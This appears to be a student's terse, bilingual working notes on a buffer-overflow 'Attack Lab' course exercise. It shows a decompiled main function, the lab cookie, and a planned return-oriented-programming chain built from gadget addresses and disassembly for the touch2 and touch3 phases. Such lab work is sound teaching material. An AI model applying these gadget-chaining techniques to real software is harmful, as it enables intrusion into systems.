## Attack lab  
### preparation  
进行ida 7.7 与8.3的杂交
main函数如下
~~~cpp
{

    int __fastcall main(int argc, const char **argv, const char **envp)
    {
    const char *v3; // rbp
    int v4; // r13d
    unsigned int v5; // r14d
    int result; // eax
    char v7; // al

    signal(11, (__sighandler_t)seghandler);
    signal(7, (__sighandler_t)bushandler);
    signal(4, (__sighandler_t)illegalhandler);
    if ( is_checker )
    {
        signal(14, (__sighandler_t)sigalrmhandler);
        alarm(5u);
        v3 = "hi:a:l:";
    }
    else
    {
        v3 = "hqi:";
    }
    infile = (FILE *)stdin;
    v4 = 0;
    v5 = 0;
    while ( 2 )
    {
        v7 = getopt(argc, (char *const *)argv, v3);
        if ( v7 == -1 )
        {
        initialize_target(v4, 0);
        if ( is_checker )
        {
            if ( v5 != authkey )
            {
            printf("Supplied authentication key 0x%x != target key\n", v5);
            check_fail();
            }
        }
        printf("Cookie: 0x%x\n", cookie);
        stable_launch(buf_offset);
        return 0;
        }
        else
        {
        switch ( v7 )
        {
            case 'a':
            v5 = strtoul(optarg, 0LL, 16);
            continue;
            case 'h':
            usage((char *)*argv);
            case 'i':
            infile = fopen(optarg, "r");
            if ( infile )
                continue;
            fprintf(stderr, "Cannot open input file '%s'\n", optarg);
            result = 1;
            break;
            case 'l':
            v4 = strtol(optarg, 0LL, 10);
            continue;
            case 'q':
            notify = 0;
            continue;
            default:
            printf("Unknown flag '%c'\n", (unsigned int)v7);
            usage((char *)*argv);
        }
        }
        break;
    }
    return result;
    }
}
~~~

0x25866403

32 35 38 36 36 34 30 33 x



4
要执行的第一条
cookie（以便于弹出）
    弹出到eax
第二条
    把eax移动到edi
目标(touch2)

五
1   rsp,rax     401a32
2   rax,rdi     401974


3   pop rax(输入的偏移量) 40196f
4    偏移量48
5   eax,ecx     4019e1
6   ecx,edx     4019d4
7   edx,esi     4019af

8   lea rdi,rsi,rax     4019a8
9   rax,rdi             401974

10   touch3              4018dd
11  cookie              25866403

+9*8 = 72d = 48x


0000000000401a30 <setval_436>:
  401a30:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)		    401a32: mov rsp,rax	        ///
  401a36:	c3                   	retq   
0000000000401972 <addval_130>:
  401972:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax		401974: mov rax,rdi	        ///
  401978:	c3                   	retq   

000000000040196b <setval_301>:                                                    
  40196b:	c7 07 6f e1 58 90    	movl   $0x9058e16f,(%rdi)		    40196f: pop rax     	    ///
  401971:	c3                   	retq                                         0x48
                                                                                
00000000004019de <addval_212>:
  4019de:	8d 87 50 89 c1 90    	lea    -0x6f3e76b0(%rdi),%eax		4019e1: mov eax,ecx	        ///
  4019e4:	c3                   	retq   
00000000004019d0 <addval_200>:
  4019d0:	8d 87 09 3b 89 ca    	lea    -0x3576c4f7(%rdi),%eax  		4019d4: mov ecx,edx	        ///
  4019d6:	c3                   	retq   
00000000004019ad <setval_216>:
  4019ad:	c7 07 89 d6 90 90    	movl   $0x9090d689,(%rdi)			4019af: mov edx,esi	        ///
  4019b3:	c3                   	retq   

00000000004019a8 <add_xy>:
  4019a8:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax			you surely want this	    ///
  4019ac:	c3                   	retq   
0000000000401972 <addval_130>:
  401972:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax		401974: mov rax, rdi    	///
  401978:	c3                   	retq   

                                                                    10   touch3              4018dd
                                                                    11  cookie              25866403

我直接进攻
401d19 <validate>

pop rax(输入的偏移量) 40196f
    3
1   rsp,rax     401a32
2   rax,rdi     401974


要输入char 的ascii字符！